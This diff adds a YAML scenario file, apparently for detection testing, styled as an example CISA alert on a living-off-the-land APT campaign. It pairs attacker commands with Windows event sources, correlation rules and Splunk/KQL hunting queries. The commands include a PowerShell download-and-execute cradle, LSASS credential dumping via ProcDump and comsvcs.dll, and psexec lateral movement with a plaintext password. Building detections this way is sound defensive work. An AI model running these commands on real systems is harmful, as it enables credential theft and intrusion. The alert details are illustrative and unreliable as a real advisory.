@@ -1,0 +1,436 @@
+# CISA Alert AA24-060A (Example)
+# Title: APT Actors Exploit Living Off The Land Techniques
+# Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060a
+# Note: This is an example scenario based on typical CISA alert format
+
+alert:
+  id: "AA24-060A"
+  title: "APT Actors Exploit Living Off The Land Techniques"
+  release_date: "2024-02-29"
+  severity: "High"
+  
+  threat_actor: "APT_UNKNOWN"
+  threat_actor_aliases:
+    - "TEMP.Veles"
+    
+  campaign:
+    name: "Living Off The Land Campaign"
+    first_seen: "2024-01-15"
+    target_sectors:
+      - "Critical Infrastructure"
+      - "Energy"
+      - "Manufacturing"
+    target_countries:
+      - "US"
+      - "Canada"
+      
+  mitre_attack:
+    tactics:
+      - "TA0002"    # Execution
+      - "TA0003"    # Persistence
+      - "TA0004"    # Privilege Escalation
+      - "TA0005"    # Defense Evasion
+      - "TA0006"    # Credential Access
+      - "TA0007"    # Discovery
+      - "TA0008"    # Lateral Movement
+    techniques:
+      - id: "T1059.003"
+        name: "Windows Command Shell"
+        procedure: "Batch scripts for execution"
+      - id: "T1053.005"
+        name: "Scheduled Task/Job: Scheduled Task"
+        procedure: "Scheduled tasks for persistence"
+      - id: "T1078.002"
+        name: "Valid Accounts: Domain Accounts"
+        procedure: "Compromised domain credentials"
+      - id: "T1218.011"
+        name: "System Binary Proxy Execution: Rundll32"
+        procedure: "Rundll32 execution of malicious DLLs"
+      - id: "T1003.001"
+        name: "OS Credential Dumping: LSASS Memory"
+        procedure: "Credential dumping via ProcDump"
+      - id: "T1087.002"
+        name: "Account Discovery: Domain Account"
+        procedure: "net group /domain enumeration"
+      - id: "T1021.002"
+        name: "Remote Services: SMB/Windows Admin Shares"
+        procedure: "Lateral movement via SMB"
+        
+  technical_details:
+    initial_access:
+      vector: "Valid Compromised Credentials"
+      description: "Actors used previously compromised valid domain credentials"
+      iocs:
+        domains: []
+        ips: []
+        file_hashes:
+          md5:
+            - "a1b2c3d4e5f6789012345678901234ab"  # Example hash
+          sha256:
+            - "abcd1234efgh5678ijkl9012mnop3456qrst7890uvwx1234yzab5678cdef9012"
+        filenames:
+          - "update.bat"
+          - "sysmon.dat"
+          - "config.dll"
+          
+    execution:
+      methods:
+        - "Windows Command Shell"
+        - "Rundll32"
+        - "PowerShell"
+      commands:
+        - "cmd.exe /c update.bat"
+        - "rundll32.exe config.dll,Start"
+        - "powershell.exe -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage2.ps1')"
+        - "net group \"Domain Admins\" /domain"
+        - "net view \\DC01 /all"
+        
+    persistence:
+      methods:
+        - "Scheduled Tasks"
+        - "Registry Run Keys"
+      scheduled_tasks:
+        - name: "SystemUpdate"
+          command: "cmd.exe /c C:\\Windows\\Temp\\update.bat"
+          trigger: "At startup"
+          user: "SYSTEM"
+          
+    privilege_escalation:
+      methods:
+        - "Token Impersonation"
+        - "Bypass User Account Control"
+        
+    defense_evasion:
+      methods:
+        - "Living Off The Land Binaries"
+        - "Masquerading"
+        - "Process Injection"
+      lolbins:
+        - "rundll32.exe"
+        - "certutil.exe"
+        - "regsvr32.exe"
+        
+    credential_access:
+      methods:
+        - "LSASS Memory"
+      tools:
+        - name: "ProcDump"
+          command: "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+        - name: "comsvcs.dll MiniDump"
+          command: "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump PID C:\\temp\\lsass.dmp full"
+          
+    discovery:
+      methods:
+        - "Account Discovery"
+        - "Network Share Discovery"
+        - "Remote System Discovery"
+      commands:
+        - "net group /domain"
+        - "net view /domain"
+        - "net view \\DC01"
+        - "nltest /dclist:corp.local"
+        - "ping -n 1 10.0.10.0/24"
+        
+    lateral_movement:
+      methods:
+        - "SMB/Windows Admin Shares"
+        - "Remote Desktop Protocol"
+      commands:
+        - "net use \\WK-WIN-015\\C$ /user:corp.local\\admin P@ssw0rd"
+        - "copy payload.exe \\WK-WIN-015\\C$\\Windows\\Temp\\"
+        - "psexec.exe \\WK-WIN-015 -u admin -p P@ssw0rd cmd.exe"
+        
+    exfiltration:
+      methods:
+        - "Exfiltration Over C2 Channel"
+      channels:
+        - protocol: "HTTPS"
+          domain: "cdn.updateservice.org"
+          user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+          
+    command_and_control:
+      protocols:
+        - "HTTPS"
+      domains:
+        - "cdn.updateservice.org"
+        - "api.microsoft-update.net"
+      ips:
+        - "185.220.101.42"
+        - "192.42.116.203"
+
+# Scenario definition
+scenario:
+  name: "Living Off The Land APT Campaign"
+  description: "APT campaign using native Windows tools and LOLBins to evade detection"
+  
+  duration:
+    total: 172800              # 48 hours total campaign
+    phases:
+      - name: "initial_compromise"
+        duration: 3600        # 1 hour
+        start_offset: 0
+        description: "Initial access using compromised credentials"
+        
+      - name: "discovery_privesc"
+        duration: 14400       # 4 hours
+        start_offset: 3600
+        description: "Domain enumeration and privilege escalation"
+        
+      - name: "credential_access"
+        duration: 7200        # 2 hours
+        start_offset: 18000
+        description: "LSASS memory dumping and credential harvesting"
+        
+      - name: "lateral_movement"
+        duration: 28800       # 8 hours
+        start_offset: 25200
+        description: "Movement across network via SMB and RDP"
+        
+      - name: "persistence_collection"
+        duration: 43200       # 12 hours
+        start_offset: 54000
+        description: "Establish persistence and data collection"
+        
+      - name: "exfiltration"
+        duration: 21600       # 6 hours
+        start_offset: 97200
+        description: "Data staging and exfiltration"
+        
+  events:
+    initial_compromise:
+      sources:
+        - type: "windows"
+          channel: "Security"
+          event_ids: [4624, 4625, 4648]
+          logon_types: [3, 10]
+          description: "Suspicious logon events"
+          weight: 0.4
+          
+        - type: "windows"
+          channel: "System"
+          event_ids: [7036, 7040]
+          description: "Service control manager events"
+          weight: 0.2
+          
+        - type: "firewall"
+          events: ["traffic"]
+          dst_ports: [3389, 5985]
+          description: "RDP and WinRM connections"
+          weight: 0.4
+          
+    discovery:
+      sources:
+        - type: "windows"
+          channel: "Security"
+          event_ids: [4688]
+          processes:
+            - "net.exe"
+            - "nltest.exe"
+            - "ping.exe"
+            - "nslookup.exe"
+            - "whoami.exe"
+          command_line_patterns:
+            - "group /domain"
+            - "view /domain"
+            - "dclist:"
+          weight: 0.5
+          
+        - type: "sysmon"
+          event_ids: [1]
+          processes:
+            - "net.exe"
+            - "nltest.exe"
+          weight: 0.3
+          
+        - type: "sysmon"
+          event_ids: [22]       # DNS Query
+          query_patterns:
+            - "_ldap._tcp.dc._msdcs.*"
+          weight: 0.2
+          
+    credential_access:
+      sources:
+        - type: "windows"
+          channel: "Security"
+          event_ids: [4688]
+          processes:
+            - "procdump.exe"
+            - "rundll32.exe"
+            - "taskmgr.exe"
+          command_line_patterns:
+            - "lsass"
+            - "minidump"
+            - "comsvcs"
+          weight: 0.6
+          
+        - type: "sysmon"
+          event_ids: [10]        # ProcessAccess
+          call_trace_patterns:
+            - "dbghelp.dll"
+            - "dbgcore.dll"
+          weight: 0.4
+          
+    lateral_movement:
+      sources:
+        - type: "windows"
+          channel: "Security"
+          event_ids: [4624, 4648, 4688]
+          logon_types: [3]
+          processes:
+            - "psexec.exe"
+            - "psexesvc.exe"
+            - "wmic.exe"
+            - "cmd.exe"
+          command_line_patterns:
+            - "\\\\\\\\*\\\C$"     # Admin share access
+          weight: 0.4
+          
+        - type: "firewall"
+          events: ["traffic"]
+          dst_ports: [445, 135, 3389]
+          weight: 0.3
+          
+        - type: "sysmon"
+          event_ids: [3]
+          dst_ports: [445, 135, 3389]
+          weight: 0.3
+          
+    persistence:
+      sources:
+        - type: "windows"
+          channel: "Security"
+          event_ids: [4698, 4699, 4700, 4701, 4702]  # Scheduled tasks
+          weight: 0.5
+          
+        - type: "sysmon"
+          event_ids: [12, 13]    # Registry events
+          registry_keys:
+            - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+          weight: 0.3
+          
+        - type: "windows"
+          channel: "System"
+          event_ids: [7036]      # Service events
+          weight: 0.2
+          
+    exfiltration:
+      sources:
+        - type: "firewall"
+          events: ["traffic"]
+          dst_domains:
+            - "cdn.updateservice.org"
+            - "api.microsoft-update.net"
+          bytes_threshold: 50000000
+          weight: 0.5
+          
+        - type: "proxy"
+          events: ["web_access"]
+          dst_domains:
+            - "cdn.updateservice.org"
+          upload_size_threshold: 10000000
+          weight: 0.3
+          
+        - type: "dns"
+          events: ["query"]
+          query_types: ["TXT"]
+          frequency_threshold: 500
+          weight: 0.2
+
+  correlation:
+    - name: "lolbin_rundll32_execution"
+      description: "Rundll32 executing suspicious DLL"
+      sequence:
+        - event: "sysmon"
+          event_id: 1
+          condition: "Image contains 'rundll32' AND CommandLine contains '.dll'"
+          window: 60
+      severity: "HIGH"
+      
+    - name: "credential_dumping_lsass"
+      description: "Possible LSASS credential dumping"
+      sequence:
+        - event: "sysmon"
+          event_id: 10
+          condition: "TargetImage contains 'lsass' AND GrantedAccess contains '0x1010'"
+          aggregate:
+            threshold: 1
+      severity: "CRITICAL"
+      
+    - name: "suspicious_scheduled_task"
+      description: "Scheduled task created in suspicious location"
+      sequence:
+        - event: "windows"
+          event_id: 4698
+          condition: "TaskContent contains 'Temp' OR TaskContent contains 'Windows\\\\System32'"
+      severity: "HIGH"
+      
+    - name: "domain_reconnaissance"
+      description: "Multiple domain enumeration commands"
+      sequence:
+        - event: "sysmon"
+          event_id: 1
+          condition: "CommandLine contains 'net group' OR CommandLine contains 'nltest'"
+          aggregate:
+            field: "Computer"
+            threshold: 5
+            window: 300
+      severity: "MEDIUM"
+
+  variations:
+    - name: "slow_and_low"
+      description: "Slow attack spread over weeks"
+      multiplier: 0.1
+      timing_jitter: 0.8
+      
+    - name: "weekend_attack"
+      description: "Attack executed during weekend hours"
+      time_window:
+        days: [5, 6]           # Friday, Saturday
+        hours: [18, 23]        # 6PM to 11PM
+      
+    - name: "business_hours_camouflage"
+      description: "Attack blended with business hours activity"
+      time_window:
+        days: [0, 1, 2, 3, 4]  # Weekdays
+        hours: [9, 17]         # Business hours
+      multiplier: 0.5
+
+detection:
+  sigma_rules:
+    - name: "proc_dump_lsass"
+      status: "stable"
+      level: "high"
+      
+    - name: "rundll32_suspicious_execution"
+      status: "stable"
+      level: "medium"
+      
+    - name: "domain_reconnaissance_commands"
+      status: "experimental"
+      level: "low"
+      
+  splunk_searches:
+    - name: "LSASS Access by Non-System Process"
+      query: |
+        index=sysmon EventCode=10 TargetImage="*lsass.exe" 
+          (GrantedAccess="*0x1010*" OR GrantedAccess="*0x1410*" OR GrantedAccess="*0x143a*")
+        | stats count by Computer, SourceImage, GrantedAccess
+        | where SourceImage!="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
+        
+    - name: "Suspicious Scheduled Task Creation"
+      query: |
+        index=windows EventCode=4698
+        | xmlkv TaskContent
+        | search Command="*Temp*" OR Command="*.dll*"
+        | table _time, Computer, TaskName, Command, Author
+        
+  kql_queries:
+    - name: "Rundll32 Suspicious Execution"
+      query: |
+        Sysmon
+        | where EventID == 1 and Image contains "rundll32"
+        | extend Args = split(CommandLine, " ")
+        | extend Dll = tostring(Args[1])
+        | where Dll contains ".dll" and not(Dll contains "C:\\Windows\\System32\\")
+        | project TimeGenerated, Computer, Image, CommandLine, Dll
